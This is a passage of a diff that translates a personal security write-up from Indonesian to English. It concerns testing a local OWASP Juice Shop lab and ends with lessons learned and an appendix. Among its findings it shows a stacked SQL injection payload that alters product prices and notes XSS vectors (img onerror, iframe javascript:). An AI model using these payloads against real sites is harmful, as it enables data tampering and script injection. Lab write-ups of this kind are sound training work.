   → "apple'; UPDATE Products SET price=0--"
-  → respons: SQLITE_ERROR: near ";": syntax error
-  → driver pakai all() yang tidak izinkan multi-statement
-  → SQLi di endpoint ini READ-ONLY
+  → response: SQLITE_ERROR: near ";": syntax error
+  → driver uses all() which disallows multi-statement
+  → SQLi on this endpoint is READ-ONLY
 
-✗ Reflected XSS via &lt;script&gt; tag biasa
-  → &lt;script&gt;alert(1)&lt;/script&gt; disimpan tapi TIDAK eksekusi
-    (innerHTML tidak menjalankan &lt;script&gt;)
-  → butuh &lt;img onerror&gt; / &lt;iframe src=javascript:&gt;
+✗ Reflected XSS via a plain &lt;script&gt; tag
+  → &lt;script&gt;alert(1)&lt;/script&gt; is stored but does NOT execute
+    (innerHTML does not run &lt;script&gt;)
+  → requires &lt;img onerror&gt; or &lt;iframe src=javascript:&gt;
 </code></pre></div>
 
-<p><strong>Yang terbukti nyata: 2 kerentanan (broken access control + DOM XSS).</strong>
-Yang lain: tersimpan tapi tidak mengeksekusi — dicatat apa adanya.</p>
+<p><strong>Confirmed real: 2 vulnerabilities (broken access control + DOM XSS).</strong>
+Everything else: stored but non-executing — recorded as such.</p>
 <hr />
-<h2 id="8-pelajaran">8. Pelajaran</h2>
+<h2 id="8-lessons-learned">8. Lessons Learned</h2>
 <p><strong>1. SQLi READ ≠ SQLi WRITE.</strong>
-Bisa <code>UNION SELECT</code> bukan berarti bisa <code>UPDATE</code>. Cek dulu apakah driver
-mengizinkan stacked query. Kalau <code>;</code> ditolak → cari jalur tulis lain.</p>
-<p><strong>2. Broken access control lebih umum dari SQLi.</strong>
-Gue awalnya fokus nge-bongkar SQL lagi. Padahal bug terbesar ada di
-<code>PUT</code> yang kelupaan dilindungi. <strong>Uji otorisasi dulu, baru injeksi.</strong></p>
-<p><strong>3. Baca kode sumber kalau ada.</strong>
-<code>main.js</code> (1,2 MB) memberi jawaban pasti: <code>bypassSecurityTrustHtml</code>.
-Gak perlu nebak — kodenya bilang sendiri.</p>
-<p><strong>4. <code>200 OK</code> ≠ terbukti.</strong>
-Harus verifikasi state berubah. Gue lakukan: GET ulang → nilai benar berubah.</p>
-<p><strong>5. Bersihkan setelah latihan.</strong>
-36 produk gue rusakin → DB dihapus &amp; di-seed ulang → produk kembali normal.
-Selalu restore lab setelah main.</p>
+Being able to <code>UNION SELECT</code> does not mean you can <code>UPDATE</code>. Check whether the
+driver permits stacked queries first. If <code>;</code> is rejected, find another write path.</p>
+<p><strong>2. Broken access control is more common than SQL injection.</strong>
+I initially went hunting for more SQL injection. The largest bug was a <code>PUT</code>
+route someone forgot to protect. <strong>Test authorisation first, injection second.</strong></p>
+<p><strong>3. Read the source when it is available.</strong>
+<code>main.js</code> (1.2 MB) gave a definitive answer: <code>bypassSecurityTrustHtml</code>. No
+guessing required — the code said it outright.</p>
+<p><strong>4. <code>200 OK</code> is not proof.</strong>
+State change must be verified. I did: re-GET → the value had genuinely changed.</p>
+<p><strong>5. Clean up after yourself.</strong>
+36 products were damaged → DB deleted and re-seeded → products restored.
+Always restore the lab after testing.</p>
 <hr />
-<h2 id="9-lampiran">9. Lampiran</h2>
-<div class="codehilite"><pre><span></span><code>Kode akar masalah : main.js, fungsi trustProductDescription + searchValue
-Bukti DB rusak    : writeups/evidence/tampered.sqlite
-Bukti eksekusi    : xss_tereksekusi=2 (headless browser, hasil tercatat)
-Metode verifikasi : curl (state) + headless browser (XSS DOM)
-Lab               : OWASP Juice Shop lokal — restored setelah uji
+<h2 id="9-appendix">9. Appendix</h2>
+<div class="codehilite"><pre><span></span><code>Root-cause code : main.js, trustProductDescription + searchValue
+Damaged DB proof: writeups/evidence/tampered.sqlite
+Execution proof : xss_executed=2 (headless browser, recorded)
+Method          : curl (state) + headless browser (DOM XSS)
+Lab             : local OWASP Juice Shop — restored after testing
 </code></pre></div>
-<div class="crumbs" style="margin-top:52px"><a href="../index.html">← balik ke daftar writeup</a></div>
+<div class="crumbs" style="margin-top:52px"><a href="../index.html">← back to all write-ups</a></div>
 </div></article>
 <footer class="site"><div class="wrap">
-  <span>Portofolio keamanan — latihan lab legal (OWASP Juice Shop).</span>
-  <span class="mono">dibuat 2026-10-09</span>
+  <span>Security research portfolio — testing performed in authorised training labs.</span>
+  <span class="mono">built 2026-10-09</span>
 </div></footer>
 </body>
 </html>
